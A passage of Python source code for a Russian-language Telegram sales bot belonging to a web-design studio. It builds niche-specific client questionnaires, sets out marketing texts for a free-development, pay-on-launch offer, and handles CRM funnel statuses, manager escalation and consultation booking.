         "hint": "Квартиры, дома, коммерческая, участки", "text": True},
        {"key": "realty_deal", "icon": "📑", "q": "Какие сделки для вас основные?",
         "opts": ["Продажа", "Аренда", "Продажа и аренда"]},
    ]},
    "beauty": {"replaces": [], "steps": [
        {"key": "masters_count", "icon": "👩‍🎨", "q": "Сколько мастеров и на чём они специализируются?",
         "text": True},
        {"key": "needs_booking", "icon": "🗓", "q": "Нужна онлайн-запись на сайте?",
         "opts": ["Да, нужна", "Нет"]},
    ]},
    "fitness": {"replaces": [], "steps": [
        {"key": "membership_types", "icon": "🎫", "q": "Какие абонементы и форматы оплаты?", "text": True},
        {"key": "needs_booking", "icon": "🗓", "q": "Нужна запись на тренировки через сайт?",
         "opts": ["Да, нужна", "Нет"]},
    ]},
    "food": {"replaces": [], "steps": [
        {"key": "cuisine_type", "icon": "🍜", "q": "Какой тип кухни?", "text": True},
        {"key": "has_delivery", "icon": "🛵", "q": "Есть доставка?", "opts": ["Да, есть", "Нет"]},
        {"key": "needs_booking", "icon": "🗓", "q": "Нужно онлайн-бронирование столиков?",
         "opts": ["Да, нужно", "Нет"]},
    ]},
    "hotel": {"replaces": [], "steps": [
        {"key": "rooms_types", "icon": "🛏", "q": "Какие номера или домики у вас есть?",
         "hint": "Категории, вместимость", "text": True},
        {"key": "needs_booking", "icon": "🗓", "q": "Нужно онлайн-бронирование на сайте?",
         "opts": ["Да, нужно", "Нет"]},
    ]},
    "education": {"replaces": [], "steps": [
        {"key": "edu_programs", "icon": "📗", "q": "Какие программы и курсы вы ведёте?", "text": True},
        {"key": "edu_format", "icon": "💻", "q": "В каком формате проходит обучение?",
         "opts": ["Очно", "Онлайн", "Очно и онлайн"]},
    ]},
    "b2b": {"replaces": [], "steps": [
        {"key": "b2b_clients", "icon": "🏢", "q": "Кто ваши типичные клиенты?",
         "hint": "Отрасли, размер компаний", "text": True},
        {"key": "case_results", "icon": "🏅", "q": "Есть кейсы с результатами, которые можно показать?",
         "hint": "Можно пропустить", "text": True, "opt": True},
    ]},
    "logistics": {"replaces": [], "steps": [
        {"key": "logistics_types", "icon": "📦", "q": "Какие виды перевозок выполняете?",
         "hint": "Например: по городу, межгород, негабарит", "text": True},
        {"key": "fleet", "icon": "🚛", "q": "У вас собственный автопарк?",
         "opts": ["Да, собственный", "Частично", "Работаем с подрядчиками"]},
    ]},
    "furniture": {"replaces": [], "steps": [
        {"key": "furniture_types", "icon": "🪑", "q": "Какую мебель или изделия вы делаете?", "text": True},
        {"key": "furniture_custom", "icon": "📐", "q": "Работаете на заказ или продаёте готовое?",
         "opts": ["Только на заказ", "Только готовое", "И на заказ, и готовое"]},
    ]},
    # «Другое» - готового блока нет, поэтому нишу спрашиваем словами:
    # без неё промпт №1 не соберётся (это обязательное поле).
    "other": {"replaces": [], "steps": [
        {"key": "niche", "icon": "🧭", "q": "В какой сфере вы работаете?",
         "hint": "Одной фразой: чем занимается бизнес", "text": True},
    ]},
}

# Доп. вопросы под выбранную цель (документ: «некоторые вопросы адаптируются под цель»)
GOAL_EXTRA_STEPS = {
    "catalog": [
        {"key": "catalog_size", "icon": "🔢", "q": "Сколько примерно позиций и категорий нужно показать?",
         "hint": "Например: 40 товаров в 5 категориях", "text": True},
    ],
    "booking": [
        {"key": "booking_details", "icon": "🗓", "q": "Что и как должны бронировать клиенты?",
         "hint": "Услуга, мастер, дата и время", "text": True},
    ],
    # для цели «больше заявок» доп.вопрос не нужен: Telegram-уведомления входят в пакет
    # по умолчанию, а всё остальное закрывает универсальное ядро.
}

# Подписи для нишевых вопросов (сводка анкеты)
NICHE_LABELS = {
    "work_types": "🔨 Виды работ", "main_objects": "🏢 Основные объекты",
    "materials_tech": "🧱 Технологии/материалы", "doctors": "👨‍⚕️ Врачи",
    "equipment": "🔬 Оборудование", "car_brands": "🚘 Марки авто",
    "waiting_area": "☕ Зона ожидания", "production_what": "⚙️ Что производим",
    "production_capacity": "📦 Мощности", "b2b_or_b2c": "🤝 B2B/B2C",
    "law_areas": "📚 Направления права", "case_results": "🏅 Кейсы",
    "consult_format": "💬 Формат консультаций", "realty_types": "🏠 Типы объектов",
    "realty_deal": "📑 Тип сделок", "realty_base": "🗂 База объектов",
    "beauty_services": "✨ Процедуры", "masters_count": "👩‍🎨 Мастера",
    "needs_booking": "🗓 Онлайн-запись", "fitness_directions": "🤸 Направления",
    "membership_types": "🎫 Абонементы", "cuisine_type": "🍜 Тип кухни",
    "has_menu": "📖 Меню", "has_delivery": "🛵 Доставка",
    "rooms_types": "🛏 Номера", "hotel_services": "🧖 Услуги на территории",
    "edu_programs": "📗 Программы", "edu_format": "💻 Формат обучения",
    "edu_result": "🎓 Документ выпускника", "b2b_services": "📊 Услуги для бизнеса",
    "b2b_clients": "🏢 Клиенты", "logistics_types": "📦 Виды перевозок",
    "fleet": "🚛 Автопарк", "furniture_types": "🪑 Изделия",
    "furniture_custom": "📐 На заказ/готовое", "catalog_size": "🔢 Объём каталога",
    "booking_details": "🗓 Что бронируют", "lead_handling": "📥 Куда слать заявки",
}
BRIEF_LABELS.update(NICHE_LABELS)


def build_brief_steps(goal=None, niche=None):
    """Собрать анкету: ядро + нишевой блок + вопросы под цель.
    Нишевые вопросы вставляются сразу после блока «о бизнесе» и могут
    заменять общие вопросы ядра (чтобы не спрашивать одно и то же дважды)."""
    block = NICHE_BLOCKS.get(niche or "", {"replaces": [], "steps": []})
    extra = GOAL_EXTRA_STEPS.get(goal or "", [])
    inserted = list(block["steps"]) + list(extra)
    drop = set(block.get("replaces", [])) | {s["key"] for s in inserted}
    # нишу клиент уже выбрал кнопкой - второй раз не спрашиваем
    if niche and niche != "other":
        drop.add("niche")
    core = [s for s in BRIEF_STEPS if s["key"] not in drop]
    if not inserted:
        return core
    anchor = next((i for i, s in enumerate(core) if s["key"] == "target_audience"), None)
    if anchor is None:
        return core + inserted
    return core[:anchor + 1] + inserted + core[anchor + 1:]


def steps_of(st):
    """Шаги анкеты текущего клиента (динамические) или общее ядро."""
    return (st or {}).get("steps") or BRIEF_STEPS


def niche_picker_kb():
    rows = [[{"text": label, "callback_data": f"niche:{nid}"}] for nid, label in NICHES]
    rows.append([{"text": "⬅️ Назад к целям", "callback_data": "brief:start"}])
    return {"inline_keyboard": rows}


def brief_progress_bar(i, n):
    filled = round((i / n) * 10)
    return "🟩" * filled + "⬜️" * (10 - filled)


def brief_render(st):
    i = st["i"]
    steps = steps_of(st)
    step = steps[i]
    n = len(steps)
    bar = brief_progress_bar(i, n)
    head = (f"{bar}  <b>{i+1}/{n}</b>\n\n"
            f"{step.get('icon','📝')} <b>{step['q']}</b>")
    if step.get("hint"):
        head += f"\n<i>{step['hint']}</i>"
    if step.get("opt"):
        head += "\n\n<i>Необязательно - можно пропустить.</i>"
    nav = []
    if step.get("opt"):
        nav.append({"text": "⏭ Пропустить", "callback_data": "b:skip"})
    # с первого вопроса возвращаемся к выбору ниши, дальше - на шаг назад
    nav.append({"text": "⬅️ Назад", "callback_data": "b:back" if i > 0 else "b:toniche"})
    nav.append({"text": "❌ Отменить", "callback_data": "b:cancel"})
    if step.get("multi"):
        # мультивыбор: несколько галочек на одном экране вместо пачки отдельных вопросов
        data = st.get("data", {})
        kb_rows = [[{"text": ("✅ " if data.get(k) == "Да, есть" else "⬜️ ") + label,
                     "callback_data": f"b:m:{idx}"}]
                   for idx, (k, label) in enumerate(step["multi"])]
        kb_rows.append([{"text": "➡️ Дальше", "callback_data": "b:mdone"}])
        kb_rows.append(nav)
    elif step.get("opts"):
        kb_rows = [[{"text": o, "callback_data": f"b:o:{idx}"}] for idx, o in enumerate(step["opts"])]
        kb_rows.append(nav)
    else:
        kb_rows = [nav]
    return head, {"inline_keyboard": kb_rows}


def brief_push(chat_id, uid, st, force_send=False):
    """Показать текущий шаг анкеты - редактируя предыдущее сообщение, а не спамя новыми."""
    text, kb = brief_render(st)
    mid = st.get("mid")
    if mid and not force_send:
        r = tg("editMessageText", chat_id=chat_id, message_id=mid, text=text,
               parse_mode="HTML", reply_markup=kb)
        if r and r.get("ok"):
            state_set(uid, st)
            return
    r = send(chat_id, text, kb)
    if r and r.get("ok"):
        st["mid"] = r["result"]["message_id"]
    state_set(uid, st)


def brief_flash_choice(chat_id, st, idx):
    """Мгновенно подсветить выбранный вариант галочкой перед переходом дальше."""
    steps = steps_of(st)
    step = steps[st["i"]]
    n = len(steps)
    bar = brief_progress_bar(st["i"], n)
    head = (f"{bar}  <b>{st['i']+1}/{n}</b>\n\n"
            f"{step.get('icon','📝')} <b>{step['q']}</b>")
    kb_rows = []
    for j, o in enumerate(step["opts"]):
        kb_rows.append([{"text": f"✅ {o}" if j == idx else o,
                         "callback_data": "b:noop" if j == idx else f"b:o:{j}"}])
    mid = st.get("mid")
    if mid:
        tg("editMessageText", chat_id=chat_id, message_id=mid, text=head,
           parse_mode="HTML", reply_markup={"inline_keyboard": kb_rows})
    # без искусственной задержки - сразу переходим к следующему вопросу


def brief_summary_text(data, steps=None):
    lines = ["🟩" * 10 + "  <b>готово</b>", "",
             "📋 <b>Проверьте ответы</b>", ""]
    for step in (steps or BRIEF_STEPS):
        k = step["key"]
        val = (data.get(k) or "").strip()
        label = BRIEF_LABELS.get(k, k)
        if not val:
            lines.append(f"➖ <b>{label}</b> - <i>пропущено</i>")
            continue
        short = val if len(val) <= 90 else val[:88].rstrip() + "…"
        lines.append(f"✅ <b>{label}</b>\n     {short}")
    lines.append("")
    lines.append("Всё верно? Дальше подберём подходящий пакет.")
    return "\n".join(lines)


def show_brief_summary(chat_id, uid, st):
    st["stage"] = "summary"
    text = brief_summary_text(st["data"], steps_of(st))
    kb = {"inline_keyboard": [
        [{"text": "✅ Всё верно, отправляю", "callback_data": "b:ok"}],
        [{"text": "🔄 Заполнить заново", "callback_data": "b:redo"}],
    ]}
    mid = st.get("mid")
    r = None
    if mid:
        r = tg("editMessageText", chat_id=chat_id, message_id=mid, text=text,
               parse_mode="HTML", reply_markup=kb)
    if not (r and r.get("ok")):
        r = send(chat_id, text, kb)
        if r and r.get("ok"):
            st["mid"] = r["result"]["message_id"]
    state_set(uid, st)


def brief_advance(chat_id, user, uid, st):
    """Перейти к следующему вопросу или показать резюме."""
    if st["i"] >= len(steps_of(st)):
        show_brief_summary(chat_id, uid, st)
    else:
        brief_push(chat_id, uid, st)


# ============================================================================
#  НОВАЯ ЛОГИКА КВАЛИФИКАЦИИ (документ «ONYX_Новая_логика_квалификации_бота»)
#  Приветствие → цель → анкета → автоподбор пакета → ознакомление → правила →
#  оплата → мини-квалификация (4 вопроса) → допуск → реквизиты/заказ.
#  Голосовые/видео от основателя пока заменены текстом - см. пометки TODO,
#  подставить sendVoice/sendVideoNote, когда будут готовы файлы.
# ============================================================================
def normalize_brief_data(d):
    """Развернуть компактные ответы анкеты в поля, которые ждёт генератор промптов.
    Один вопрос клиенту → несколько полей в производственных данных."""
    d = dict(d or {})

    # «Пермь и Пермский район» → город = Пермь, география = весь ответ
    city_raw = (d.get("city") or "").strip()
    if city_raw:
        d.setdefault("geo", city_raw)
        head = re.split(r"[,;]|\s+и\s+", city_raw, maxsplit=1)[0].strip()
        d["city"] = head or city_raw

    # первым в списке услуг клиент указывает приоритетную
    services = (d.get("main_services") or "").strip()
    if services and not (d.get("priority_services") or "").strip():
        d["priority_services"] = re.split(r"[,;\n]", services, maxsplit=1)[0].strip()

    # доверие: одним ответом закрываем гарантии/опыт/этапы для промптов
    trust = (d.get("trust_facts") or "").strip()
    if trust:
        d.setdefault("guarantees", trust)

    # остальные контакты одной строкой - в поле мессенджеров (там же почта/адрес/график)
    extra = (d.get("contacts_extra") or "").strip()
    if extra and not (d.get("messengers") or "").strip():
        d["messengers"] = extra

    # домен / действующий сайт
    ds = (d.get("domain_site") or "").strip()
    if ds:
        low = ds.lower()
        if low in ("нет", "no", "-", "нету", "пока нет", "нет"):
            d["has_domain"] = "Нет"
            d["domain_name"] = ""
        else:
            d["has_domain"] = "Да, есть"
            d["domain_name"] = ds
    else:
        d.setdefault("has_domain", "Нет")

    # пожелания по стилю → стиль + референсы (ссылки вытаскиваем отдельно)
    sw = (d.get("style_wishes") or "").strip()
    if sw:
        d.setdefault("style_preferences", sw)
        links = re.findall(r"(?:https?://|www\.)\S+|\b[\w-]+\.(?:ru|com|рф|net|io)\b", sw)
        if links and not (d.get("reference_sites") or "").strip():
            d["reference_sites"] = ", ".join(links)

    for k in ("has_logo", "has_photos", "has_portfolio", "has_reviews", "documents"):
        d.setdefault(k, "Нет")
    return d


GOALS = [
    ("visitka", "🪪 Рассказать о себе - сайт-визитка"),
    ("leads", "📈 Получать больше заявок и звонков"),
    ("booking", "🗓 Принимать онлайн-записи"),
    ("catalog", "🛍 Показать каталог товаров или услуг"),
    ("unsure", "🤔 Пока не знаю - помогите выбрать"),
]
GOAL_RU = dict(GOALS)

# TODO: заменить на tg("sendVideoNote"/"sendVoice", ...) с готовым файлом от основателя.
GREETING_TEXT = """# 👋 Сайт вы увидите раньше, чем заплатите

Разработка стоит **0 ₽**. Не акция, не рассрочка, не «первый месяц в подарок».

Мы соберём ваш сайт целиком и пришлём ссылку. Вы откроете его с телефона
и посмотрите глазами своего клиента.

**Понравится** - оплатите запуск, и мы публикуем.
**Не понравится** - разойдёмся, вы не должны ни рубля.

## Почему мы так можем
Нам невыгодно делать плохо. Пока вы не сказали «да», мы не заработали ничего.
Поэтому спорим внутри команды, а не с вами.

## Что нужно от вас
Пятнадцать минут на вопросы о бизнесе. Остальное - наша работа.

> За запуск платят один раз: домен, хостинг и функции, которые вам правда нужны.
> Абонентки нет."""

HR = "➖➖➖➖➖➖➖➖➖➖➖➖"

# --- Rich Markdown версии длинных экранов (заголовки, списки, таблицы) ---
PRODUCTION_EXPLAIN_MD = """## 🏭 Как мы будем делать ваш сайт

### 1. Соберём сайт целиком
Возьмём ваши ответы и материалы и сделаем **готовый сайт** - со структурой,
текстами, блоками и формой заявки. Не макет и не черновик.

### 2. Покажем вам результат
Вы откроете сайт по ссылке и посмотрите его целиком, как это увидят ваши клиенты.

### 3. Внесём ваши правки
Соберёте пожелания - мы их внесём одним заходом.

### 4. Запустим
Подключим домен, разместим на хостинге, установим сертификат безопасности
и опубликуем.

---

> 💡 **Важно:** всё, что до пункта 4 - бесплатно.
> Вы видите готовый сайт раньше, чем платите за него хоть рубль."""

PAYMENT_EXPLAIN_MD = """## 💳 Самое важное - про деньги

| Этап | Что происходит | Оплата |
|---|---|---|
| 1 | Полностью создаём сайт | - |
| 2 | Показываем готовый результат | - |
| 3 | Сайт вам нравится | **оплата запуска** |
| 4 | Публикуем | - |

---

### ❗️ До того как вы утвердите готовый сайт, вы не платите ничего

Ни предоплаты, ни брони, ни «оплатите первый этап».
Сначала результат - потом деньги.

*Чек официальный, через «Мой налог» (422-ФЗ).*"""

RULES_TEXT_MD = """## 📐 Как проходят правки

Когда сайт готов, мы показываем его вам целиком.

Дальше - **один пакет правок**: вы собираете все пожелания
и присылаете их одним сообщением, мы вносим всё за один заход.

> **Почему так:** именно это позволяет держать разработку бесплатной.
> Бесконечные доработки по одной мелочи - как раз то, за что студии берут деньги."""

INVOICE_EXPLAIN_MD = """## 🧾 Как будет выставлен счёт

Сейчас мы попросим реквизиты - **это не значит, что нужно платить**.
Реквизиты нужны, чтобы счёт был готов заранее и не тормозил запуск.

### Как это пойдёт
1. Вы утверждаете готовый сайт
2. Мы выставляем официальный счёт
3. Вы оплачиваете запуск
4. Мы публикуем сайт и передаём доступы

---

📃 После оплаты придёт официальный чек через «Мой налог» (422-ФЗ) -
его можно провести по бухгалтерии."""

# Объяснение производства - показывается перед правилами, чтобы клиент понимал,
# что именно сейчас начнётся и почему оплата будет позже.
PRODUCTION_EXPLAIN = (
    "🏭 <b>КАК МЫ БУДЕМ ДЕЛАТЬ ВАШ САЙТ</b>\n"
    f"{HR}\n\n"
    "<b>1. Соберём сайт целиком</b>\n"
    "Возьмём ваши ответы и материалы и сделаем готовый сайт - со структурой, "
    "текстами, блоками и формой заявки. Не макет и не черновик.\n\n"
    "<b>2. Покажем вам результат</b>\n"
    "Вы откроете сайт по ссылке и посмотрите его целиком, как это увидят ваши клиенты.\n\n"
    "<b>3. Внесём ваши правки</b>\n"
    "Соберёте пожелания - мы их внесём одним заходом.\n\n"
    "<b>4. Запустим</b>\n"
    "Подключим домен, разместим на хостинге, установим сертификат безопасности "
    "и опубликуем.\n\n"
    f"{HR}\n"
    "💡 <b>Важно:</b> всё, что до пункта 4 - бесплатно. Вы видите готовый сайт "
    "раньше, чем платите за него хоть рубль."
)

# Объяснение счёта - перед сбором реквизитов.
INVOICE_EXPLAIN = (
    "🧾 <b>КАК БУДЕТ ВЫСТАВЛЕН СЧЁТ</b>\n"
    f"{HR}\n\n"
    "Сейчас мы попросим реквизиты - <b>это не значит, что нужно платить</b>. "
    "Реквизиты нужны, чтобы счёт был готов заранее и не тормозил запуск.\n\n"
    "<b>Как это пойдёт:</b>\n"
    "1️⃣ Вы утверждаете готовый сайт\n"
    "2️⃣ Мы выставляем официальный счёт\n"
    "3️⃣ Вы оплачиваете запуск\n"
    "4️⃣ Мы публикуем сайт и передаём доступы\n\n"
    f"{HR}\n"
    "📃 После оплаты придёт официальный чек через «Мой налог» (422-ФЗ) - "
    "его можно провести по бухгалтерии."
)

# Информирование о хранении материалов (Google Drive)
DRIVE_INFO = """### 🔒 Что будет с вашими материалами
- Храним в отдельной защищённой папке вашего проекта
- Используем только для разработки вашего сайта
- Вы можете заменить любой файл в любой момент
- После запуска материалы остаются в проекте - чтобы быстро обновлять сайт дальше

> Никому не передаём и в других проектах не используем."""


# TODO: заменить на голосовое от основателя.
RULES_TEXT = (
    "📐 <b>Как проходят правки</b>\n\n"
    "Когда сайт готов, мы показываем его вам целиком.\n\n"
    "Дальше - <b>один пакет правок</b>: вы собираете все пожелания и присылаете их "
    "одним сообщением, мы вносим всё за один заход.\n\n"
    "<i>Почему так:</i> именно это позволяет держать разработку бесплатной. "
    "Бесконечные доработки по одной мелочи - как раз то, за что студии берут деньги."
)

# TODO: заменить на голосовое от основателя.
PAYMENT_EXPLAIN_TEXT = (
    "💳 <b>САМОЕ ВАЖНОЕ - ПРО ДЕНЬГИ</b>\n"
    f"{HR}\n\n"
    "🚀 Сначала мы <b>полностью создаём</b> сайт\n"
    "🚀 Затем <b>показываем</b> вам готовый результат\n"
    "🚀 Если сайт устраивает - <b>только тогда</b> оплата запуска\n\n"
    f"{HR}\n\n"
    "❗️ <b>До того как вы утвердите готовый сайт, вы не платите ничего.</b>\n\n"
    "Ни предоплаты, ни брони, ни «оплатите первый этап». "
    "Сначала результат - потом деньги.\n\n"
    "<i>Чек официальный, через «Мой налог» (422-ФЗ).</i>"
)

AUDIT_INTRO_MD = (
    "# 🔍 Разберём ваш сайт\n\n"
    "Пришлите адрес - проверим за полминуты и покажем понятным языком: "
    "что отпугивает клиентов, во что это обходится и как мы это закрываем.\n\n"
    "Например: `onyx-web.ru`\n\n"
    "> Разбор бесплатный и остаётся у вас, даже если работать будем не вместе."
)

GOAL_PICK_MD = (
    "# 🎯 Какая задача у сайта?\n\n"
    "От этого зависит, какие вопросы мы зададим и как соберём структуру.\n\n"
    "> Обсуждали на консультации - просто подтвердите."
)

CRM_STATUSES = [
    ("new_lead", "Новый лид"),
    ("first_contact", "Первый контакт"),
    ("material_sent", "Материал отправлен"),
    ("audit_requested", "Аудит запрошен"),
    ("audit_delivered", "Аудит выдан"),
    ("consult_offered", "Консультация предложена"),
    ("consult_scheduled", "Консультация назначена"),
    ("consult_done", "Консультация проведена"),
    ("project_setup", "Оформление проекта"),
    ("anketa_started", "Анкета начата"),
    ("anketa_done", "Анкета завершена"),
    ("package_offered", "Пакет рекомендован"),
    ("qualifying", "Квалификация"),
    ("qualified", "Квалифицирован - разрешено производство"),
    ("materials_waiting", "Ожидание материалов"),
    ("materials_received", "Материалы получены"),
    ("production", "Производство"),
    ("presentation_set", "Презентация назначена"),
    ("presentation_first", "Первая презентация"),
    ("changes_waiting", "Ожидание правок"),
    ("changes_received", "Правки получены"),
    ("final_version", "Финальная версия"),
    ("invoice_sent", "Счёт отправлен"),
    ("paid", "Оплата получена"),
    ("launch", "Запуск"),
    ("done", "Завершено"),
    ("refused", "Отказ"),
    ("postponed", "Отложено"),
]
CRM_RU = dict(CRM_STATUSES)
CRM_ORDER = {k: i for i, (k, _) in enumerate(CRM_STATUSES)}

# О смене этих статусов админ узнаёт сразу - это точки, где нужен человек.
CRM_LOUD = {"consult_scheduled", "consult_done", "qualified", "materials_received",
            "changes_received", "paid", "refused"}


def crm_get(uid):
    return _get(f"onyx:crm:{uid}") or {}


def crm_status(uid):
    return (crm_get(uid) or {}).get("status", "new_lead")


def crm_at_least(uid, status):
    """Дошёл ли клиент хотя бы до этого этапа воронки."""
    return CRM_ORDER.get(crm_status(uid), -1) >= CRM_ORDER.get(status, 999)


def crm_set(uid, status, note="", notify=None):
    """Перевести лид на этап воронки. Пишет историю, таблицу и (по надобности) админам."""
    if status not in CRM_RU:
        return None
    rec = crm_get(uid)
    prev = rec.get("status", "")
    if prev == status:
        return rec
    hist = (rec.get("history") or [])[-40:]
    hist.append({"status": status, "at": now_str(), "note": note[:200]})
    rec.update({"telegram_id": uid, "status": status, "prev": prev,
                "history": hist, "note": note[:200], "updated_at": now_str()})
    _set(f"onyx:crm:{uid}", rec, ttl=YEAR)
    try:
        post_to_sheet({"table": "CRM", "telegram_id": uid, "status": status,
                       "status_ru": CRM_RU[status], "prev": prev,
                       "note": note[:300], "updated_at": now_str()})
        journal_add(client_id_of(uid), "crm_status", prev=prev, new=status)
    except Exception as e:
        print("crm_set err", e)
    if notify or (notify is None and status in CRM_LOUD):
        p = user_get(uid) or {}
        who = ("@" + p.get("username", "")) if p.get("username") else f"id {uid}"
        notify_admins(f"📊 <b>{CRM_RU[status]}</b>\n{who}"
                      + (f"\n{note[:300]}" if note else ""))
    return rec


def escalate(uid, reason, detail=""):
    """Позвать человека: задача менеджеру + уведомление. Бот не заменяет менеджера."""
    p = user_get(uid) or {}
    who = ("@" + p.get("username", "")) if p.get("username") else f"id {uid}"
    try:
        create_task("lead", uid, f"{reason} - {who}", description=detail[:500],
                    telegram_id=uid, priority="high", notify=False)
    except Exception as e:
        print("escalate task err", e)
    notify_admins(f"🔔 <b>{reason}</b>\n{who}"
                  + (f"\n\n{detail[:500]}" if detail else "")
                  + f"\n\nЭтап: {CRM_RU.get(crm_status(uid), '-')}")


def help_row(back=None):
    """Кнопка «позвать человека» - должна быть на каждом ключевом экране."""
    row = [{"text": "💬 Задать вопрос", "callback_data": "ask:mgr"}]
    if back:
        row.append({"text": "⬅️ Назад", "callback_data": back})
    return row


# ─────────────────────── Вход: три ветки ───────────────────────

ENTRY_MD = (
    "# Сайт вы увидите раньше, чем заплатите\n\n"
    "Разработка - **0 ₽**. Мы соберём сайт, покажем вживую, и только если "
    "он вам понравится, вы оплатите запуск. Не понравится - разойдёмся, "
    "вы не должны ни рубля.\n\n"
    "Начинаем не с прайса, а с разбора. Один вопрос, чтобы понять, "
    "с чего начать именно вам 👇"
)


def entry_kb():
    return {"inline_keyboard": [
        [{"text": "🌐 Сайт есть - разберите его", "callback_data": "entry:site"}],
        [{"text": "📋 Сайта нет - что мне нужно?", "callback_data": "entry:nosite"}],
        [{"text": "🤝 Я уже общался с менеджером", "callback_data": "entry:manager"}],
    ]}


NOSITE_MD = (
    "# 📋 Тогда начнём с разбора\n\n"
    "Сайта нет - значит чинить нечего, надо понять, какой он должен быть. "
    "Чтобы разговор был предметным, вот два шага.\n\n"
    "### 1. Чек-лист\n"
    "14 пунктов, которые стоит собрать до начала работы, и 6 условий, "
    "о которых важно договориться с любым подрядчиком. Полезен, даже если "
    "работать будете не с нами.\n\n"
    "### 2. Персональный разбор\n"
    "Бесплатная встреча, где мы вместе решим, какой сайт нужен именно вашему "
    "бизнесу: что он должен показывать и как приводить клиентов к заявке.\n\n"
    "> Разработка у нас стоит 0 ₽ - но это не причина обращаться. "
    "Причина в том, что вы увидите результат раньше, чем заплатите."
)


def nosite_kb():
    rows = []
    if CHECKLIST_URL:
        rows.append([{"text": "📖 Открыть чек-лист", "url": CHECKLIST_URL}])
    rows.append([{"text": "🎯 Получить персональный план сайта", "callback_data": "cons:offer"}])
    rows.append(help_row("entry:back"))
    return {"inline_keyboard": rows}


MANAGER_MD = (
    "# 🤝 Продолжим с того места, где остановились\n\n"
    "Если консультация уже прошла, менеджер присылал персональную ссылку - "
    "откройте её, и мы продолжим оформление проекта с вашими данными.\n\n"
    "Ссылки нет или потерялась? Нажмите «Позвать менеджера» - "
    f"{MANAGER_NAME} вернёт её в течение 30 минут.\n\n"
    f"Или напишите ему сами: {manager_md()}"
)


def manager_kb(uid):
    rows = []
    if crm_at_least(uid, "consult_done"):
        rows.append([{"text": "▶️ Продолжить оформление", "callback_data": "proj:start"}])
    rows.append([{"text": "🔔 Позвать менеджера", "callback_data": "ask:mgr"}])
    rows.append([{"text": "🎯 Записаться на консультацию", "callback_data": "cons:offer"}])
    rows.append([{"text": "⬅️ Назад", "callback_data": "entry:back"}])
    return {"inline_keyboard": rows}


# ─────────────────────── Конвертер: консультация ───────────────────────

CONSULT_MD = (
    "# 🎯 Персональный план сайта\n\n"
    "Бесплатная стратегическая консультация. За одну встречу определим, какой "
    "сайт нужен вашему бизнесу, что он должен показывать и как приводить "
    "человека к заявке.\n\n"
    "---\n\n"
    "### Что вы получите\n"
    "- Разбор текущей ситуации: откуда идут клиенты и где вы их теряете\n"
    "- Слабые места в том, как бизнес выглядит со стороны\n"
    "- Предварительную структуру сайта: какие блоки нужны и в каком порядке\n"
    "- Рекомендации по содержанию: что показывать, чем доказывать\n"
    "- Понимание, какой пакет запуска подходит и сколько он стоит\n"
    "- План действий - он останется у вас в любом случае\n\n"
    "---\n\n"
    "> Занимает 20-30 минут. Ничего готовить не нужно. Если после разговора "
    "решите не работать с нами - план всё равно ваш.\n\n"
    "**Как вам удобнее?**"
)


def consult_way_kb():
    return {"inline_keyboard": [
        [{"text": "💬 Здесь, в Telegram", "callback_data": "cons:way:tg"}],
        [{"text": "📞 Позвоните мне", "callback_data": "cons:way:call"}],
        help_row("entry:back"),
    ]}


CONS_WHEN = [("today", "Сегодня"), ("tomorrow", "Завтра"),
             ("days", "В ближайшие дни"), ("any", "Когда вам удобно - свяжитесь первыми")]
CONS_WHEN_RU = dict(CONS_WHEN)


def cons_when_kb():
    rows = [[{"text": lbl, "callback_data": f"cons:when:{k}"}] for k, lbl in CONS_WHEN]
    rows.append([{"text": "⬅️ Назад", "callback_data": "cons:offer"}])
    return {"inline_keyboard": rows}


def cons_finish(chat_id, mid, uid, user, st):
    """Записать на консультацию: CRM, задача менеджеру, напоминание клиенту."""
    way = st.get("way", "tg")
    phone = st.get("phone", "")
    when = st.get("when", "any")
    uname = user.get("username", "")
    prof = user_get(uid) or {}
    site = prof.get("audit_site") or prof.get("website") or ""
    state_del(uid)

    _set(f"onyx:consult:{uid}", {
        "telegram_id": uid, "username": uname, "way": way, "phone": phone,
        "when": when, "site": site, "created_at": now_str()}, ttl=YEAR)

    contact = f"тел. {phone}" if way == "call" else (f"@{uname}" if uname else f"id {uid}")
    edit_rich(chat_id, mid, "\n".join([
        "# ✅ Записали", "",
        "| | |", "|---|---|",
        f"| Формат | {'Звонок' if way == 'call' else 'Telegram'} |",
        f"| Контакт | {contact} |",
        f"| Когда | {CONS_WHEN_RU.get(when, when)} |", "",
        "Менеджер свяжется с вами в это время. Планы поменялись - просто "
        "напишите здесь, перенесём.", "",
        "> Пока ждёте, можно открыть чек-лист: часть вопросов на консультации "
        "мы разберём быстрее, если вы уже посмотрели список."]),
        reply_markup={"inline_keyboard": (
            ([[{"text": "📖 Открыть чек-лист", "url": CHECKLIST_URL}]] if CHECKLIST_URL else [])
            + ([[{"text": "📱 Оставить номер на всякий случай",
                  "callback_data": "cons:phone"}]] if not phone else [])
            + [help_row(),
               [{"text": "⬅️ Изменить время", "callback_data": "cons:offer"},
                {"text": "🏠 В меню", "callback_data": "b:home"}]])})

    crm_set(uid, "consult_scheduled",
            f"{'звонок ' + phone if way == 'call' else 'Telegram'} · "
            f"{CONS_WHEN_RU.get(when, when)}" + (f" · сайт {site}" if site else ""))
    try:
        create_task("lead", uid, f"Стратегическая консультация - {contact}",
                    description=f"Когда: {CONS_WHEN_RU.get(when, when)}. "
                                f"Формат: {'звонок' if way == 'call' else 'Telegram'}. "
                                f"Сайт: {site or '-'}.",
                    telegram_id=uid, priority="high", notify=False)
        cancel_followups(uid, ("audit_no_order", "idle_after_start", "consult_invite"))
        schedule_followup(uid, "consult_reminder", uname)
    except Exception as e:
        print("cons task err", e)
    log_event(uid, "consult_scheduled", way)
    lead_touch(uid, username=uname, status="audit_sent", action="consult_scheduled")
    post_to_sheet({"table": "Consultations", "telegram_id": uid, "username": uname,
                   "way": way, "phone": phone, "when": CONS_WHEN_RU.get(when, when),
                   "site": site, "created_at": now_str()})


# ─────────────────────── После консультации: оформление ───────────────────────

PROJECT_START_MD = (
    "# ▶️ Оформляем проект\n\n"
    "Консультация прошла - решение принято. Дальше короткая часть: уточним "
    "задачу, соберём данные для сборки и зафиксируем условия.\n\n"
    "| Шаг | Что делаем |\n|---|---|\n"
    "| 1 | Цель сайта и сфера - 2 вопроса |\n"
    "| 2 | Как мы работаем - короткое объяснение |\n"
    "| 3 | Анкета по вашему бизнесу - 5-10 минут |\n"
    "| 4 | Пакет запуска и условия |\n"
    "| 5 | Материалы в вашу папку на Диске |\n\n"
    "> Всё, что вы уже рассказали менеджеру, спрашивать заново не будем."
)


def project_start_kb():
    return {"inline_keyboard": [
